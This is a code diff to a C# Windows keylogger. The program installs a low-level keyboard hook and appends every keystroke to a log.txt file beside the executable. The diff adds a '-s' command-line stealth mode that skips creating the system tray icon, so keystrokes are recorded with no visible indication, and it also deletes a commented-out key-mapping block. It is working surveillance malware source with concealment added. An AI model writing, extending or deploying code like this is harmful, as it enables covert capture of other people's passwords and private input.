@@ -10,13 +10,12 @@ using System.Windows.Forms;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
-using System.Collections;
 
 namespace Logger
 {
     static class Program
     {
-        static void Main()
+        static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
 
@@ -24,11 +23,31 @@ namespace Logger
 
             _hookID = SetHook(_proc);
 
+            bool stealth = false;
+            
+            try
+            {
+                string stealthCheck = args[0];
+                if (stealthCheck == "-s")
+                {
+                    stealth = true;
+                }
+            }
+            catch
+            {
+                // DO NOTHING
+            }
+
+            if (stealth == false)
+            {
+                SystemTray tray = new SystemTray();
+            }
+
             Application.Run();
 
             UnhookWindowsHookEx(_hookID);
         }
-        
+
         private const int WH_KEYBOARD_LL = 13;
 
         private const int WM_KEYDOWN = 0x0100;
@@ -58,19 +77,6 @@ namespace Logger
                 StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);
 
                 string key = Convert.ToString((Keys)vkCode);
-
-                /*ArrayList list = new ArrayList();
-                list.Add(new string[] { "Oem1", "Ç" });
-
-                foreach(string[] str in list)
-                {
-                    if(key == str[0])
-                    {
-                        key = str[1];
-
-                        break;
-                    }
-                }*/
 
                 sw.Write(key + " ");
 
